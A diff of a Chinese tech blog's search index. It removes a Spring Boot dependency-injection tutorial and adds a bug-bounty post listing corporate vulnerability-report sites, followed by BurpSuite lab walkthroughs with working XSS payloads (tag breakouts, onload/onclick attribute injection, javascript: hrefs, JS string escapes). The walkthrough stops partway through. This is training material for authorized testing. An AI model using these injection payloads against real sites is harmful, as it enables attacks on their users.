-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
-
-<h1 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h1><h2 id="产品背景"><a href="#产品背景" class="headerlink" title="产品背景"></a>产品背景</h2><ol>
-<li><p>Spring生态众多，不止一两个框架而已，下图是一些Spring生态中比较出名的框架。可以看到从数据库、web、cloud到Android、LDAP等等，很多方向都有框架。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
-</li>
-<li><p>SpringFramework（以下简称SF）是Spring生态中最重要的一环、是最根本的基石，简单理解Spring中其他框架都来自于SF，所以也有很多人把SF简称为Spring，就像把DBMS简称为数据库是一样的道理。SpringBoot（以下简称SB）是基于SF，在web方向开发出来的一款框架（其实SF中的SpringMVC本就可以开发web，以前的“SSM”三件套，只是SB更加专业，逐渐代替了SSM）。SB对于开发者而言方便很多，现在Java后端几乎都采用SB进行开发，而且如下图所示，SB还可以和其他的一些工具&#x2F;框架相结合，使得web框架可定制化程度更高，更加受到开发者的青睐。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
-</li>
-<li><p>SB与SF的对应关系</p>
-<table>
-<thead>
-<tr>
-<th align="center">Spring Boot 版本</th>
-<th align="center">对应的 Spring Framework 版本范围</th>
-<th align="center">发布时间</th>
-<th align="center">支持状态</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">3.3.x</td>
-<td align="center">6.2.x</td>
-<td align="center">2024 年</td>
-<td align="center">最新版本，持续更新</td>
-</tr>
-<tr>
-<td align="center">3.2.x</td>
-<td align="center">6.1.x</td>
-<td align="center">2023 年底</td>
-<td align="center">活跃支持中（OSS 支持至 2025 年）</td>
-</tr>
-<tr>
-<td align="center">3.1.x</td>
-<td align="center">6.0.x</td>
-<td align="center">2023 年</td>
-<td align="center">已停止 OSS 支持，商业支持中</td>
-</tr>
-<tr>
-<td align="center">3.0.x</td>
-<td align="center">6.0.x（早期版本）</td>
-<td align="center">2022 年底</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.7.x（LTS）</td>
-<td align="center">5.3.x</td>
-<td align="center">2021 年</td>
-<td align="center">长期支持（至 2025 年 11 月）</td>
-</tr>
-<tr>
-<td align="center">2.6.x</td>
-<td align="center">5.3.x</td>
-<td align="center">2021 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.5.x</td>
-<td align="center">5.3.x</td>
-<td align="center">2021 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.4.x</td>
-<td align="center">5.3.x</td>
-<td align="center">2020 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.3.x</td>
-<td align="center">5.2.x</td>
-<td align="center">2020 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.2.x</td>
-<td align="center">5.2.x</td>
-<td align="center">2019 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.1.x（LTS）</td>
-<td align="center">5.1.x</td>
-<td align="center">2018 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">2.0.x</td>
-<td align="center">5.0.x</td>
-<td align="center">2018 年</td>
-<td align="center">已停止支持</td>
-</tr>
-<tr>
-<td align="center">1.5.x（LTS）</td>
-<td align="center">4.3.x</td>
-<td align="center">2017 年</td>
-<td align="center">已停止支持</td>
-</tr>
-</tbody></table>
-</li>
-</ol>
-<h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><ol>
-<li><p>通过SpringBoot（以下简称SB）插件快速创建SB项目</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
-</li>
-<li><p>项目结构</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
-</li>
-<li><p>关键代码展示（IOC&#x2F;DI）</p>
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//注册为SB的一个组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//如果有多个类型相同的组件，需要根据具体的类，指定要关联哪一个组件</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//自动关联类为UserDao的组件</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//这三行代码相当于：UserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过注解，告诉SB这是一个配置类****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//告诉SB，要管理哪个包下面的组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>单元测试</p>
- <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//如果报错，在pom.xml中添加junit依赖</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取SB容器（这里是根据JavaConfig这个类创建出来的容器）</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//获取容器中的一个Bean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序输出：UserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DI之后) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>开发</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>后端</tag>
-        <tag>SpringBoot</tag>
       </tags>
   </entry>
   <entry>
@@ -1680,6 +1126,560 @@
         <tag>渗透</tag>
         <tag>web</tag>
         <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SRC挖掘</title>
+    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<table>
+<thead>
+<tr>
+<th align="center">Name</th>
+<th align="center">Link</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">字节跳动安全应急响应中心</td>
+<td align="center"><a href="https://security.bytedance.com/submit">https://security.bytedance.com/submit</a></td>
+</tr>
+<tr>
+<td align="center">腾讯安全应急响应中心</td>
+<td align="center"><a href="https://security.tencent.com/index.php/report/add">https://security.tencent.com/index.php/report/add</a></td>
+</tr>
+<tr>
+<td align="center">阿里安全应急响应中心</td>
+<td align="center"><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td>
+</tr>
+<tr>
+<td align="center">京东安全应急响应中心</td>
+<td align="center"><a href="http://security.jd.com/">http://security.jd.com/</a></td>
+</tr>
+<tr>
+<td align="center">百度安全应急响应中心</td>
+<td align="center"><a href="http://sec.baidu.com/views/main/loophole.html#home">http://sec.baidu.com/views/main/loophole.html#home</a></td>
+</tr>
+<tr>
+<td align="center">顺丰安全应急响应中心</td>
+<td align="center"><a href="http://sfsrc.sf-express.com/submitBug">http://sfsrc.sf-express.com/submitBug</a></td>
+</tr>
+<tr>
+<td align="center">360应急响应中心</td>
+<td align="center"><a href="https://security.360.cn/Report/index">https://security.360.cn/Report/index</a></td>
+</tr>
+<tr>
+<td align="center">哔哩哔哩安全应急响应中心</td>
+<td align="center"><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td>
+</tr>
+<tr>
+<td align="center">爱奇艺安全应急响应中心</td>
+<td align="center"><a href="https://security.iqiyi.com/#submit">https://security.iqiyi.com/#submit</a></td>
+</tr>
+<tr>
+<td align="center">蚂蚁集团安全应急响应中心</td>
+<td align="center"><a href="https://security.alipay.com/sc/afsrc/home.htm">https://security.alipay.com/sc/afsrc/home.htm</a></td>
+</tr>
+<tr>
+<td align="center">BIGO SRC</td>
+<td align="center"><a href="https://security.bigo.sg/#/submittingReport">https://security.bigo.sg/#/submittingReport</a></td>
+</tr>
+<tr>
+<td align="center">贝壳安全应急响应中心</td>
+<td align="center"><a href="https://security.ke.com/vuls">https://security.ke.com/vuls</a></td>
+</tr>
+<tr>
+<td align="center">360漏洞云众包</td>
+<td align="center"><a href="https://src.360.net/home">https://src.360.net/home</a></td>
+</tr>
+<tr>
+<td align="center">58安全应急响应中心</td>
+<td align="center"><a href="https://security.58.com/">https://security.58.com/</a></td>
+</tr>
+<tr>
+<td align="center">滴滴出行安全应急响应中心</td>
+<td align="center"><a href="http://sec.didichuxing.com/">http://sec.didichuxing.com/</a></td>
+</tr>
+<tr>
+<td align="center">东方财富安全应急响应中心</td>
+<td align="center"><a href="https://passport2.eastmoney.com/pub/login?backurl=https://se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf">https://passport2.eastmoney.com/pub/login?backurl=https%3A//se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf</a></td>
+</tr>
+<tr>
+<td align="center">斗鱼安全应急响应中心</td>
+<td align="center"><a href="https://security.douyu.com/">https://security.douyu.com/</a></td>
+</tr>
+<tr>
+<td align="center">安全应急响应中心</td>
+<td align="center"><a href="https://security.duxiaoman.com/views/main/loophole.html#home">https://security.duxiaoman.com/views/main/loophole.html#home</a></td>
+</tr>
+<tr>
+<td align="center">DHgate安全应急响应中心</td>
+<td align="center"><a href="http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html">http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html</a></td>
+</tr>
+<tr>
+<td align="center">富友安全应急响应中心</td>
+<td align="center"><a href="https://fsrc.fuiou.com/">https://fsrc.fuiou.com/</a></td>
+</tr>
+<tr>
+<td align="center">货拉拉安全应急响应中心</td>
+<td align="center"><a href="https://llsrc.huolala.cn/">https://llsrc.huolala.cn/</a></td>
+</tr>
+<tr>
+<td align="center">合合安全应急响应中心</td>
+<td align="center"><a href="https://security.intsig.com/">https://security.intsig.com/</a></td>
+</tr>
+<tr>
+<td align="center">火线安全平台</td>
+<td align="center"><a href="https://www.huoxian.cn/login">https://www.huoxian.cn/login</a></td>
+</tr>
+<tr>
+<td align="center">好未来安全应急响应中心</td>
+<td align="center"><a href="http://src.100tal.com/">http://src.100tal.com/</a></td>
+</tr>
+<tr>
+<td align="center">华为安全激励计划</td>
+<td align="center"><a href="https://bugbounty.huawei.com/">https://bugbounty.huawei.com/</a></td>
+</tr>
+<tr>
+<td align="center">焦点安全应急响应中心</td>
+<td align="center"><a href="https://security.focuschina.com/home/index/report.html">https://security.focuschina.com/home/index/report.html</a></td>
+</tr>
+<tr>
+<td align="center">竞技安全应急响应中心</td>
+<td align="center"><a href="https://security.jj.cn/">https://security.jj.cn/</a></td>
+</tr>
+<tr>
+<td align="center">快手安全应急响应中心</td>
+<td align="center"><a href="https://security.kuaishou.com/#/submit">https://security.kuaishou.com/#/submit</a></td>
+</tr>
+<tr>
+<td align="center">联想安全应急响应中心</td>
+<td align="center"><a href="https://lsrc.vulbox.com/">https://lsrc.vulbox.com/</a></td>
+</tr>
+<tr>
+<td align="center">同程旅行安全应急响应中心</td>
+<td align="center"><a href="https://sec.ly.com/">https://sec.ly.com/</a></td>
+</tr>
+<tr>
+<td align="center">美丽联合集团安全应急响应中心</td>
+<td align="center"><a href="http://security.mogujie.com/#/">http://security.mogujie.com/#/</a></td>
+</tr>
+<tr>
+<td align="center">魅族安全应急响应中心</td>
+<td align="center"><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td>
+</tr>
+<tr>
+<td align="center">陌陌安全应急响应中心</td>
+<td align="center"><a href="https://security.immomo.com/">https://security.immomo.com/</a></td>
+</tr>
+<tr>
+<td align="center">马蜂窝安全应急响应中心</td>
+<td align="center"><a href="https://security.mafengwo.cn/submit">https://security.mafengwo.cn/submit</a></td>
+</tr>
+<tr>
+<td align="center">美团安全应急响应中心</td>
+<td align="center"><a href="https://security.meituan.com/">https://security.meituan.com/</a></td>
+</tr>
+<tr>
+<td align="center">OPPO安全应急响应中心</td>
+<td align="center"><a href="https://security.oppo.com/add.jsp">https://security.oppo.com/add.jsp</a></td>
+</tr>
+<tr>
+<td align="center">网易安全中心</td>
+<td align="center"><a href="http://anquan.163.com/module/hole/new-hole.html">http://anquan.163.com/module/hole/new-hole.html</a></td>
+</tr>
+<tr>
+<td align="center">平安安全应急响应中心</td>
+<td align="center"><a href="http://security.pingan.com/submit">http://security.pingan.com/submit</a></td>
+</tr>
+<tr>
+<td align="center">去哪儿安全应急响应中心</td>
+<td align="center"><a href="https://security.qunar.com/report.php">https://security.qunar.com/report.php</a></td>
+</tr>
+<tr>
+<td align="center">融360安全应急响应中心</td>
+<td align="center"><a href="https://security.rong360.com/#/leak/add">https://security.rong360.com/#/leak/add</a></td>
+</tr>
+<tr>
+<td align="center">知道创宇安全应急响应中心</td>
+<td align="center"><a href="https://www.seebug.org/">https://www.seebug.org/</a></td>
+</tr>
+<tr>
+<td align="center">新浪安全应急响应中心</td>
+<td align="center"><a href="http://sec.sina.com.cn/">http://sec.sina.com.cn/</a></td>
+</tr>
+<tr>
+<td align="center">苏宁安全应急响应中心</td>
+<td align="center"><a href="https://security.suning.com/">https://security.suning.com/</a></td>
+</tr>
+<tr>
+<td align="center">途牛安全应急响应中心</td>
+<td align="center"><a href="http://sec.tuniu.com/">http://sec.tuniu.com/</a></td>
+</tr>
+<tr>
+<td align="center">T3出行安全应急响应中心</td>
+<td align="center"><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td>
+</tr>
+<tr>
+<td align="center">唯品会安全应急响应中心</td>
+<td align="center"><a href="https://sec.vip.com/">https://sec.vip.com/</a></td>
+</tr>
+<tr>
+<td align="center">vivo安全应急响应中心</td>
+<td align="center"><a href="https://security.vivo.com.cn/#/bugsubmit">https://security.vivo.com.cn/#/bugsubmit</a></td>
+</tr>
+<tr>
+<td align="center">挖财安全应急响应中心</td>
+<td align="center"><a href="https://sec.wacai.com/">https://sec.wacai.com/</a></td>
+</tr>
+<tr>
+<td align="center">微博安全应急响应中心</td>
+<td align="center"><a href="http://wsrc.weibo.com/leak_module_view">http://wsrc.weibo.com/leak_module_view</a></td>
+</tr>
+<tr>
+<td align="center">微众银行安全应急响应中心</td>
+<td align="center"><a href="https://security.webank.com/report/add">https://security.webank.com/report/add</a></td>
+</tr>
+<tr>
+<td align="center">完美世界安全应急响应中心</td>
+<td align="center"><a href="http://security.wanmei.com/">http://security.wanmei.com/</a></td>
+</tr>
+<tr>
+<td align="center">小米安全中心</td>
+<td align="center"><a href="https://sec.xiaomi.com/submit">https://sec.xiaomi.com/submit</a></td>
+</tr>
+<tr>
+<td align="center">小赢安全应急响应中心</td>
+<td align="center"><a href="https://security.xiaoying.com/user.php?m=user&c=post&a=add">https://security.xiaoying.com/user.php?m=user&amp;c=post&amp;a=add</a></td>
+</tr>
+<tr>
+<td align="center">喜马拉雅安全应急响应中心</td>
+<td align="center"><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td>
+</tr>
+<tr>
+<td align="center">携程安全应急响应中心</td>
+<td align="center"><a href="https://sec.ctrip.com/report">https://sec.ctrip.com/report</a></td>
+</tr>
+<tr>
+<td align="center">讯飞安全应急响应中心</td>
+<td align="center"><a href="https://security.iflytek.com/user.php/post/add">https://security.iflytek.com/user.php/post/add</a></td>
+</tr>
+<tr>
+<td align="center">有赞安全应急响应中心</td>
+<td align="center"><a href="https://src.youzan.com/">https://src.youzan.com/</a></td>
+</tr>
+<tr>
+<td align="center">银联安全应急响应中心</td>
+<td align="center"><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td>
+</tr>
+<tr>
+<td align="center">宜信安全应急响应中心</td>
+<td align="center"><a href="https://security.creditease.cn/bugReport.html">https://security.creditease.cn/bugReport.html</a></td>
+</tr>
+<tr>
+<td align="center">智联招聘安全应急响应中心</td>
+<td align="center"><a href="https://src.zhaopin.com/#/submitvul">https://src.zhaopin.com/#/submitvul</a></td>
+</tr>
+<tr>
+<td align="center">中通安全应急响应中心</td>
+<td align="center"><a href="https://sec.zto.com/">https://sec.zto.com/</a></td>
+</tr>
+<tr>
+<td align="center">猪八戒网安全应急响应中心</td>
+<td align="center"><a href="https://sec.zbj.com/">https://sec.zbj.com/</a></td>
+</tr>
+<tr>
+<td align="center">自如安全应急响应中心</td>
+<td align="center"><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td>
+</tr>
+</tbody></table>
+<h1 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125160537916.png" alt="image-20251125160537916"></p>
+</li>
+<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125161021613.png" alt="image-20251125161021613"></p>
+</li>
+<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/h1&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h3 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162158840.png" alt="image-20251125162158840"></p>
+</li>
+<li><p>尝试闭合包裹的标签：<code>&lt;/p&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合p标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：yyds1的位置被过滤了，没有解析成标签；但是，yyds2的位置解析成功。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162421502.png" alt="image-20251125162421502"></p>
+</li>
+<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/p&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h3 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162932730.png" alt="image-20251125162932730"></p>
+</li>
+<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：h1标签的位置被过滤了，没有解析成标签；可以尝试闭合img标签中的属性，然后再拼接onload属性触发js代码执行, <code>&quot;onload=&quot;alert(111)</code></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125200407768.png" alt="image-20251125200407768"></p>
+</li>
+</ol>
+<h3 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。但是我们发现，输入的yyds并没有在当前页面中进行回显，需要在burp里面分析一下数据包。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201431110.png" alt="image-20251125201431110"></p>
+</li>
+<li><p>通过插件HaE，以及配置的xss规则，我们发现了数据包中可能存在xss漏洞的一些代码。然后在数据包里面搜索xss的规则（没办法，插件没有具体标明匹配到了哪条规则，需要手工确认）</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201822160.png" alt="image-20251125201822160"></p>
+</li>
+<li><p>通过分析代码，我们知道脚本会从url中获取returnPath这个参数值，并且把它放到id为backLink这个标签中的href属性中，所以我们可以尝试直接写js代码，因为浏览器可以直接解析href属性中的js代码。<code>javascript:alert(&#39;XSS&#39;)</code></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125202335789.png" alt="image-20251125202335789"></p>
+</li>
+</ol>
+<h3 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203134544.png" alt="image-20251125203134544"></p>
+</li>
+<li><p>尝试闭合h1标签，但发现尖括号被过滤。尝试第二个位置——闭合属性的双引号。在input标签中，onclick属性中的js代码可以被浏览器直接解析。<code>&quot; onclick=&quot;alert(111)</code></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203425327.png" alt="image-20251125203425327"></p>
+</li>
+</ol>
+<h3 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
+</li>
+<li><p>前面几个经验可以知道，出现在标签里面的内容，一般都会过滤见括号，所以我们直接尝试的闭合属性中的双引号，也就是这里img标签中的src属性。<code>&quot; onload=&quot;alert(111)</code>，进一步发现，没有弹窗，查看源代码双引号被转义了，浏览器解析不了。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125204157721.png" alt="image-20251125204157721"></p>
+</li>
+<li><p>进一步分析script标签中的代码，不难发现，用户的输入被放到了js代码中，并用一个searchTerms变量进行接收，我们可以尝试逃逸出这里的单引号。但是，需要保证js语法的正确性，浏览器才会正确的执行js代码。构造payload：<code>&#39; + alert(111) + &#39;</code>，最终会变成<code>var searchTerms = &#39;&#39; + alert(111) + &#39;&#39;</code>这样一个运算表达式。而alert(111)在浏览器上会被执行，并且返回undefined，所以，最终的运算结果是searchTerms&#x3D;NaN。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125210401432.png" alt="image-20251125210401432"></p>
+</li>
+</ol>
+<h3 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置（一共会出现在四个位置，我之前测试了一些，所显示为8个）。</p>
